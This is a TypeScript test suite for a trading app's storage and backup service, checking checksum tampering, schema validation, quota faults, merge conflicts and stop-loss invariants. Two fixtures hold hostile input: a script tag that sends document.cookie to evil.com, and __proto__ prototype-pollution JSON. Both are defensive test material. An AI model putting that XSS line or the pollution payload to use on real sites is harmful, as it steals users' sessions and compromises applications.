// Gen 2 Comprehensive Empirical Adversarial Verification Suite
// Target: Milestone 1 (M1: Core Domain & Dual-Layer Persistence)
// Verification Scope:
// 1. Corrupted JSON & Malformed Checksum Resilience
// 2. Schema Boundary Violations & Nested Malformed Properties
// 3. Prototype Pollution & Security Injection Protection
// 4. Storage Quota Overflow & IO Fault Injection
// 5. Multi-Instance Conflict Resolution (DRY_RUN vs OVERWRITE vs MERGE / LWW)
// 6. Hard Stop Loss Ratchet & SCALED_T1 Status Invariant Preservation
// 7. Edge Database Memory Store (Prisma Mock) Verification

import { describe, it, expect, beforeEach } from "../helpers/assertions";
import {
  LocalStoreService,
  InMemoryStorageAdapter,
  DEFAULT_USER_SETTINGS,
  DEFAULT_PORTFOLIO_STATE,
  LOCAL_STORAGE_KEYS,
} from "../../lib/storage/local-store";
import {
  generateBackupSnapshot,
  validateBackupSnapshot,
  restoreBackupSnapshot,
  computePayloadChecksum,
  canonicalJsonStringify,
  BackupService,
  BackupSnapshotEnvelope,
} from "../../lib/storage/backup-service";
import { Trade, StorageAdapter, UserSettings, PortfolioState, JournalEntry } from "../../lib/storage/types";
import { prisma } from "../../lib/prisma";

class AdversarialFaultyStorageAdapter implements StorageAdapter {
  public memory = new Map<string, string>();
  public throwOnSetItem: boolean = false;
  public throwOnGetItem: boolean = false;
  public throwOnRemoveItem: boolean = false;
  public throwOnClear: boolean = false;
  public maxByteCapacity: number = Infinity;

  getItem(key: string): string | null {
    if (this.throwOnGetItem) {
      throw new Error("Simulated storage read fault");
    }
    return this.memory.get(key) ?? null;
  }

  setItem(key: string, value: string): void {
    if (this.throwOnSetItem) {
      const err = new Error("QuotaExceededError: DOMException quota exceeded");
      err.name = "QuotaExceededError";
      throw err;
    }
    const currentSize = Array.from(this.memory.values()).reduce((acc, v) => acc + v.length, 0);
    if (currentSize + value.length > this.maxByteCapacity) {
      const err = new Error("QuotaExceededError: storage capacity breached");
      err.name = "QuotaExceededError";
      throw err;
    }
    this.memory.set(key, String(value));
  }

  removeItem(key: string): void {
    if (this.throwOnRemoveItem) {
      throw new Error("Simulated storage delete fault");
    }
    this.memory.delete(key);
  }

  clear(): void {
    if (this.throwOnClear) {
      throw new Error("Simulated storage clear fault");
    }
    this.memory.clear();
  }
}

describe("Gen 2 Adversarial Suite: Dual-Layer Persistence & Backup Engine", () => {
  let adapter: AdversarialFaultyStorageAdapter;
  let store: LocalStoreService;
  let backupService: BackupService;

  beforeEach(() => {
    adapter = new AdversarialFaultyStorageAdapter();
    store = new LocalStoreService(adapter);
    backupService = new BackupService(store);
  });

  describe("1. Corrupted Payloads & Checksum Integrity Attacks", () => {
    it("rejects corrupted non-JSON payloads and primitive values", async () => {
      const invalidInputs = [
        "",
        "   ",
        "null",
        "undefined",
        "12345",
        "true",
        "false",
        "['some', 'array']",
        "{malformed:json",
        "{\"app\": \"senior-broker-app\", \"data\": ",
        "{\"version\": 1, \"data\": {\"trades\": [}}",
      ];

      for (const input of invalidInputs) {
        const validation = await validateBackupSnapshot(input);
        expect(validation.isValid).toBe(false);
        expect(validation.errors.length).toBeGreaterThan(0);
      }
    });

    it("detects single-character payload tampering with SHA-256 validation", async () => {
      store.saveTrade({
        id: "tr-tamper-1",
        ticker: "NVDA",
        companyName: "NVIDIA Corp",
        status: "ACTIVE",
        entryTrigger: 120.0,
        sharesTotal: 25,
        sharesRemaining: 25,
        initialStop: 115.0,
        currentStop: 115.0,
        target1: 130.0,
        target2: 140.0,
        rrRatio: 2.0,
        timeStopSessions: 6,
        sessionsElapsed: 1,
      });

      const validSnapshot = await backupService.exportSnapshot();
      expect(validSnapshot.checksum.length).toBe(64);

      // Validate pristine snapshot
      const validCheck = await validateBackupSnapshot(validSnapshot);
      expect(validCheck.isValid).toBe(true);
      expect(validCheck.checksumValid).toBe(true);

      // Tamper 1: Alter trade entry price by $0.01
      const tampered1 = JSON.parse(JSON.stringify(validSnapshot));
      tampered1.data.trades[0].entryTrigger = 120.01;
      const check1 = await validateBackupSnapshot(tampered1);
      expect(check1.isValid).toBe(false);
      expect(check1.checksumValid).toBe(false);
      expect(check1.errors.some((e) => e.path === "checksum")).toBe(true);

      // Tamper 2: Alter ticker name
      const tampered2 = JSON.parse(JSON.stringify(validSnapshot));
      tampered2.data.trades[0].ticker = "NVDX";
      const check2 = await validateBackupSnapshot(tampered2);
      expect(check2.isValid).toBe(false);
      expect(check2.checksumValid).toBe(false);

      // Tamper 3: Alter portfolio cash balance
      const tampered3 = JSON.parse(JSON.stringify(validSnapshot));
      tampered3.data.portfolio = { ...tampered3.data.portfolio, cashAvailable: 999999.0 };
      const check3 = await validateBackupSnapshot(tampered3);
      expect(check3.isValid).toBe(false);
      expect(check3.checksumValid).toBe(false);
    });

    it("verifies canonical stringification is deterministic across key reordering", async () => {
      const objA = { z: 1, a: 2, m: { y: 10, b: 20 }, arr: [1, 2, { k: 3, c: 4 }] };
      const objB = { arr: [1, 2, { c: 4, k: 3 }], a: 2, m: { b: 20, y: 10 }, z: 1 };

      const hashA = await computePayloadChecksum(objA);
      const hashB = await computePayloadChecksum(objB);

      expect(hashA).toBe(hashB);
      expect(canonicalJsonStringify(objA)).toBe(canonicalJsonStringify(objB));
    });
  });

  describe("2. Schema Invalidation, Missing Fields & Boundary Violations", () => {
    it("rejects snapshots with incompatible application IDs", async () => {
      const baseSnapshot = await backupService.exportSnapshot();
      const alienApps = ["robinhood-clone", "fake-broker", "crypto-app", ""];

      for (const app of alienApps) {
        const alien = { ...baseSnapshot, app };
        const res = await validateBackupSnapshot(alien);
        expect(res.isValid).toBe(false);
        expect(res.errors.some((e) => e.path === "app")).toBe(true);
      }
    });

    it("rejects unsupported future versions (> v10) and handles legacy v0 migration", async () => {
      const baseSnapshot = await backupService.exportSnapshot();

      // Future version rejection
      const future = { ...baseSnapshot, version: 99 };
      const resFuture = await validateBackupSnapshot(future);
      expect(resFuture.isValid).toBe(false);
      expect(resFuture.errors.some((e) => e.path === "version")).toBe(true);

      // Legacy v0 migration
      const legacyV0 = {
        version: 0,
        app: "senior-broker-app",
        data: {
          trades: [
            {
              id: "tr-legacy-1",
              ticker: "AAPL",
              companyName: "Apple Inc",
              status: "ACTIVE",
              entryTrigger: 180,
              sharesTotal: 10,
              initialStop: 170,
              currentStop: 170,
              target1: 200,
              target2: 220,
              rrRatio: 2.0,
            },
          ],
        },
      };

      const resLegacy = await validateBackupSnapshot(legacyV0);
      expect(resLegacy.isValid).toBe(true);
      expect(resLegacy.versionRestored).toBe(1);
      expect(resLegacy.warnings.length).toBeGreaterThan(0);
      expect(resLegacy.snapshotData?.trades[0].timeStopSessions).toBe(6);
      expect(resLegacy.snapshotData?.trades[0].sharesRemaining).toBe(10);
    });

    it("validates data types and rejects invalid numeric bounds in portfolio and trades", async () => {
      const invalidPayload = {
        version: 1,
        app: "senior-broker-app",
        data: {
          portfolio: {
            totalCapital: -5000, // Negative capital invalid
          },
          trades: [
            {
              id: "", // Missing ID
              ticker: "TSLA",
              initialStop: "not-a-number", // Type mismatch
            },
            {
              id: "tr-bad-2",
              ticker: "", // Missing ticker
              initialStop: 100,
            },
          ],
          settings: {
            accountSize: "fifteen thousand", // Type mismatch
          },
        },
      };

      const res = await validateBackupSnapshot(invalidPayload);
      expect(res.isValid).toBe(false);
      expect(res.errors.length).toBeGreaterThanOrEqual(4);
    });
  });

  describe("3. Prototype Pollution & Malicious Payloads Defense", () => {
    it("safely ignores and sanitizes __proto__ and constructor prototype injection attempts", async () => {
      const pollutionPayload = JSON.parse(`{
        "version": 1,
        "app": "senior-broker-app",
        "data": {
          "__proto__": { "polluted": true, "isAdmin": true },
          "settings": {
            "accountSize": 15000,
            "__proto__": { "injected": "hacked" }
          },
          "trades": [
            {
              "id": "tr-exploit",
              "ticker": "EXPLOIT",
              "companyName": "Evil Corp",
              "status": "ACTIVE",
              "entryTrigger": 100,
              "sharesTotal": 10,
              "sharesRemaining": 10,
              "initialStop": 90,
              "currentStop": 90,
              "target1": 120,
              "target2": 140,
              "rrRatio": 2.0,
              "timeStopSessions": 6,
              "sessionsElapsed": 0,
              "__proto__": { "pwned": true }
            }
          ]
        }
      }`);

      const res = await backupService.importSnapshot(pollutionPayload, "OVERWRITE");
      expect(res.success).toBe(true);

      // Verify prototype pollution failed
      const testObj: any = {};
      expect(testObj.polluted).toBeUndefined();
      expect(testObj.isAdmin).toBeUndefined();
      expect(testObj.injected).toBeUndefined();
      expect(testObj.pwned).toBeUndefined();
      expect((Object.prototype as any).polluted).toBeUndefined();
      expect((Object.prototype as any).isAdmin).toBeUndefined();
    });

    it("preserves rich Unicode, symbols, and code injections without execution or data corruption", async () => {
      const dangerousNotes = "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>";
      const tradeWithScript: Trade = {
        id: "tr-xss-clean",
        ticker: "SAFE",
        companyName: "Safe Corp",
        status: "ACTIVE",
        entryTrigger: 50.0,
        sharesTotal: 20,
        sharesRemaining: 20,
        initialStop: 45.0,
        currentStop: 45.0,
        target1: 60.0,
        target2: 70.0,
        rrRatio: 2.0,
        timeStopSessions: 6,
        sessionsElapsed: 0,
        notes: dangerousNotes,
      };

      store.saveTrade(tradeWithScript);
      const snapshot = await backupService.exportSnapshot();

      const newStore = new LocalStoreService(new InMemoryStorageAdapter());
      const newBackup = new BackupService(newStore);
      const restoreRes = await newBackup.importSnapshot(snapshot, "OVERWRITE");

      expect(restoreRes.success).toBe(true);
      const retrieved = newStore.getTrade("tr-xss-clean");
      expect(retrieved?.notes).toBe(dangerousNotes);
    });
  });

  describe("4. Storage Quota Overflow & Fault Tolerance", () => {
    it("operates gracefully via L1 memory cache when localStorage writes throw QuotaExceededError", () => {
      adapter.throwOnSetItem = true;

      // Operations should not crash the app
      expect(() => {
        store.saveSettings({ accountSize: 25000.0, riskPerTrade: 1.5 });
      }).not.toThrow();

      expect(() => {
        store.saveTrade({
          id: "tr-quota-test",
          ticker: "META",
          companyName: "Meta Platforms",
          status: "ACTIVE",
          entryTrigger: 500,
          sharesTotal: 5,
          sharesRemaining: 5,
          initialStop: 480,
          currentStop: 480,
          target1: 540,
          target2: 580,
          rrRatio: 2.0,
          timeStopSessions: 6,
          sessionsElapsed: 1,
        });
      }).not.toThrow();

      expect(() => {
        store.updatePortfolio({ floatingPnL: 500.0, totalRealizedPnL: 1200.0 });
      }).not.toThrow();

      // State is reliably accessible in L1 cache
      expect(store.getSettings().accountSize).toBe(25000.0);
      expect(store.getTrade("tr-quota-test")?.ticker).toBe("META");
      expect(store.getPortfolio().floatingPnL).toBe(500.0);
    });

    it("handles read errors during hydration by falling back safely to default state", () => {
      const faultyHydrationAdapter = new AdversarialFaultyStorageAdapter();
      faultyHydrationAdapter.throwOnGetItem = true;

      expect(() => {
        const fallBackStore = new LocalStoreService(faultyHydrationAdapter);
        expect(fallBackStore.isInitialized).toBe(true);
        expect(fallBackStore.getSettings().accountSize).toBe(15000.0);
        expect(fallBackStore.getTrades()).toHaveLength(0);
      }).not.toThrow();
    });
  });

  describe("5. Multi-Instance Conflict Resolution (DRY_RUN vs OVERWRITE vs MERGE)", () => {
    it("DRY_RUN produces complete diff calculation without mutating store", async () => {
      store.saveTrade({
        id: "tr-local-1",
        ticker: "AMD",
        companyName: "AMD",
        status: "ACTIVE",
        entryTrigger: 140,
        sharesTotal: 10,
        sharesRemaining: 10,
        initialStop: 130,
        currentStop: 130,
        target1: 160,
        target2: 180,
        rrRatio: 2.0,
        timeStopSessions: 6,
        sessionsElapsed: 0,
      });

      const incoming = {
        version: 1,
        app: "senior-broker-app",
        data: {
          settings: { accountSize: 50000.0 },
          trades: [
            {
              id: "tr-local-1",
              ticker: "AMD",
              companyName: "AMD",
              status: "SCALED_T1",
              entryTrigger: 140,
              sharesTotal: 10,
              sharesRemaining: 5,
              initialStop: 130,
              currentStop: 140,
              target1: 160,
              target2: 180,
              rrRatio: 2.0,
              timeStopSessions: 6,
              sessionsElapsed: 2,
              updatedAt: "2099-01-01T00:00:00Z",
            },
            {
              id: "tr-incoming-2",
              ticker: "PLTR",
              companyName: "Palantir",
              status: "ACTIVE",
              entryTrigger: 30,
              sharesTotal: 50,
              sharesRemaining: 50,
              initialStop: 28,
              currentStop: 28,
              target1: 34,
              target2: 38,
              rrRatio: 2.0,
              timeStopSessions: 6,
              sessionsElapsed: 0,
            },
          ],
        },
      };

      const dryRun = await backupService.importSnapshot(incoming, "DRY_RUN");
      expect(dryRun.success).toBe(true);
      expect(dryRun.mode).toBe("DRY_RUN");
      expect(dryRun.stats?.tradesCreated).toBe(1);
      expect(dryRun.stats?.tradesUpdated).toBe(1);
      expect(dryRun.stats?.settingsApplied).toBe(true);

      // Local store remained unchanged
      expect(store.getSettings().accountSize).toBe(15000.0);
      expect(store.getTrades()).toHaveLength(1);
      expect(store.getTrade("tr-local-1")?.status).toBe("ACTIVE");
      expect(store.getTrade("tr-incoming-2")).toBeUndefined();
    });

    it("MERGE mode applies Last-Write-Wins timestamps and creates missing records", async () => {
      const tOld = "2026-08-01T00:00:00Z";
      const tNew = "2026-08-15T00:00:00Z";

      // Local has NEWER version of Trade A, but OLDER version of Trade B
      store.saveTrade({
        id: "tr-a",
        ticker: "AAPL",
        companyName: "Apple",
        status: "SCALED_T1",
        entryTrigger: 200,
        sharesTotal: 10,
        sharesRemaining: 5,
        initialStop: 190,
        currentStop: 200,
        target1: 220,
        target2: 240,
        rrRatio: 2.0,
        timeStopSessions: 6,
        sessionsElapsed: 3,
        updatedAt: tNew,
      });

      store.saveTrade({
        id: "tr-b",
        ticker: "MSFT",
        companyName: "Microsoft",
        status: "ACTIVE",
        entryTrigger: 400,
        sharesTotal: 10,
        sharesRemaining: 10,
        initialStop: 380,
        currentStop: 380,
        target1: 440,
        target2: 480,
        rrRatio: 2.0,
        timeStopSessions: 6,
        sessionsElapsed: 1,
        updatedAt: tOld,
      });

      // Incoming payload has OLDER version of Trade A, and NEWER version of Trade B, plus NEW Trade C
      const incomingPayload = {
        version: 1,
        app: "senior-broker-app",
        data: {
          trades: [
            {
              id: "tr-a",
              ticker: "AAPL",
              companyName: "Apple",
              status: "ACTIVE",
              entryTrigger: 200,
              sharesTotal: 10,
              sharesRemaining: 10,
              initialStop: 190,
              currentStop: 190,
              target1: 220,
              target2: 240,
              rrRatio: 2.0,
              timeStopSessions: 6,
              sessionsElapsed: 0,
              updatedAt: tOld,
            },
            {
              id: "tr-b",
              ticker: "MSFT",
              companyName: "Microsoft",
              status: "SCALED_T1",
              entryTrigger: 400,
              sharesTotal: 10,
              sharesRemaining: 5,
              initialStop: 380,
              currentStop: 400,
              target1: 440,
              target2: 480,
              rrRatio: 2.0,
              timeStopSessions: 6,
              sessionsElapsed: 3,
              updatedAt: tNew,
            },
            {
              id: "tr-c",
              ticker: "GOOGL",
              companyName: "Alphabet",
              status: "ACTIVE",
              entryTrigger: 160,
              sharesTotal: 15,
              sharesRemaining: 15,
              initialStop: 150,
              currentStop: 150,
              target1: 180,
              target2: 200,
              rrRatio: 2.0,
              timeStopSessions: 6,
              sessionsElapsed: 0,
              updatedAt: tNew,
            },
          ],
        },
      };

      const mergeResult = await backupService.importSnapshot(incomingPayload, "MERGE");
      expect(mergeResult.success).toBe(true);
      expect(mergeResult.stats?.tradesUnchanged).toBe(1); // tr-a ignored (local was newer)
      expect(mergeResult.stats?.tradesUpdated).toBe(1); // tr-b updated (incoming was newer)
      expect(mergeResult.stats?.tradesCreated).toBe(1); // tr-c created

      // Trade A remained SCALED_T1 with stop 200
      const a = store.getTrade("tr-a");
      expect(a?.status).toBe("SCALED_T1");
      expect(a?.currentStop).toBe(200);

      // Trade B upgraded to SCALED_T1 with stop 400
      const b = store.getTrade("tr-b");
      expect(b?.status).toBe("SCALED_T1");
      expect(b?.currentStop).toBe(400);

      // Trade C was added
      const c = store.getTrade("tr-c");
      expect(c?.ticker).toBe("GOOGL");
    });
  });

  describe("6. Hard Stop Loss Ratchet & SCALED_T1 Status Invariants", () => {
    it("strictly blocks downward stop loss widening on any trade mutation", () => {
      const trade: Trade = {
        id: "tr-stop-ratchet",
        ticker: "COIN",
        companyName: "Coinbase",
        status: "ACTIVE",
        entryTrigger: 220,
        sharesTotal: 10,
        sharesRemaining: 10,
        initialStop: 200,
        currentStop: 215, // Already raised to 215
        target1: 260,
        target2: 290,
        rrRatio: 2.0,
        timeStopSessions: 6,
        sessionsElapsed: 2,
      };

      store.saveTrade(trade);

      // Attempt 1: Maliciously lower stop to 195 (below initialStop)
      const attempt1 = store.saveTrade({ ...trade, currentStop: 195 });
      expect(attempt1.currentStop).toBe(215);

      // Attempt 2: Attempt to lower stop to 210 (between entry and stop)
      const attempt2 = store.saveTrade({ ...trade, currentStop: 210 });
      expect(attempt2.currentStop).toBe(215);

      // Attempt 3: Raising stop to 220 (breakeven) is accepted
      const attempt3 = store.saveTrade({ ...trade, currentStop: 220 });
      expect(attempt3.currentStop).toBe(220);

      // Attempt 4: Raising stop to 230 (trailing profit) is accepted
      const attempt4 = store.saveTrade({ ...trade, currentStop: 230 });
      expect(attempt4.currentStop).toBe(230);

      // Attempt 5: Lowering back to 220 is rejected
      const attempt5 = store.saveTrade({ ...trade, currentStop: 220 });
      expect(attempt5.currentStop).toBe(230);
    });

    it("strictly forbids status regression from SCALED_T1 back to ACTIVE even with future timestamps", async () => {
      const scaledTrade: Trade = {
        id: "tr-scale-lock",
        ticker: "AMZN",
        companyName: "Amazon",
        status: "SCALED_T1",
        entryTrigger: 180,
        sharesTotal: 20,
        sharesRemaining: 10,
        initialStop: 170,
        currentStop: 180, // Breakeven stop locked
        target1: 200,
        target2: 220,
        rrRatio: 2.0,
        timeStopSessions: 6,
        sessionsElapsed: 3,
      };

      store.saveTrade(scaledTrade);

      // Direct saveTrade attempt to revert to ACTIVE and reset shares to 20
      const directRevert = store.saveTrade({
        ...scaledTrade,
        status: "ACTIVE",
        currentStop: 170,
        sharesRemaining: 20,
      });

      expect(directRevert.status).toBe("SCALED_T1");
      expect(directRevert.currentStop).toBe(180);

      // Restore MERGE attempt with future timestamp
      const incomingFutureRevert = {
        version: 1,
        app: "senior-broker-app",
        data: {
          trades: [
            {
              ...scaledTrade,
              status: "ACTIVE",
              currentStop: 170,
              updatedAt: "2099-12-31T23:59:59Z",
            },
          ],
        },
      };

      await backupService.importSnapshot(incomingFutureRevert, "MERGE");
      const postSync = store.getTrade("tr-scale-lock");
      expect(postSync?.status).toBe("SCALED_T1");
      expect(postSync?.currentStop).toBe(180);
    });
  });

  describe("7. Universal Edge Memory Store (Prisma Store) Integrity", () => {
    it("handles User and Trade CRUD operations in Edge isolate memory store", async () => {
      // 1. User findFirst / findUnique
      const user = await prisma.user.findFirst();
      expect(user).toBeDefined();
      expect(user.email).toBe("trader@broker.com");
      expect(user.accountSize).toBe(15000.0);

      // 2. Trade Creation & Querying
      const createdTrade = await prisma.trade.create({
        data: {
          userId: user.id,
          ticker: "CRWD",
          companyName: "CrowdStrike",
          status: "ACTIVE",
          entryTrigger: 280.0,
          sharesTotal: 8,
          initialStop: 260.0,
          currentStop: 260.0,
          target1: 320.0,
          target2: 360.0,
        },
      });

      expect(createdTrade.id).toBeDefined();
      expect(createdTrade.ticker).toBe("CRWD");

      // 3. Trade findMany with filters
      const activeTrades = await prisma.trade.findMany({
        where: {
          userId: user.id,
          status: { in: ["ACTIVE", "SCALED_T1"] },
        },
      });
      expect(activeTrades.some((t: any) => t.ticker === "CRWD")).toBe(true);

      // 4. Trade Update
      const updatedTrade = await prisma.trade.update({
        where: { id: createdTrade.id },
        data: { currentStop: 280.0, status: "SCALED_T1" },
      });
      expect(updatedTrade.status).toBe("SCALED_T1");
      expect(updatedTrade.currentStop).toBe(280.0);

      // 5. Trade Delete
      await prisma.trade.delete({ where: { id: createdTrade.id } });
      const foundDeleted = await prisma.trade.findUnique({ where: { id: createdTrade.id } });
      expect(foundDeleted).toBeNull();
    });

    it("handles AlertNotifications queueing and read status updates", async () => {
      const user = await prisma.user.findFirst();

      const notif = await prisma.alertNotification.create({
        data: {
          userId: user.id,
          ticker: "CRWD",
          type: "T1_HIT",
          title: "Target 1 Reached",
          message: "CRWD hit $320.00! Scale 50% and move stop to Breakeven.",
        },
      });

      expect(notif.isRead).toBe(false);

      const unreadList = await prisma.alertNotification.findMany({
        where: { userId: user.id },
      });
      expect(unreadList.length).toBeGreaterThan(0);

      await prisma.alertNotification.update({
        where: { id: notif.id },
        data: { isRead: true },
      });

      const updatedNotif = await prisma.alertNotification.findFirst({
        where: { ticker: "CRWD", type: "T1_HIT" },
      });
      expect(updatedNotif.isRead).toBe(true);
    });
  });
});
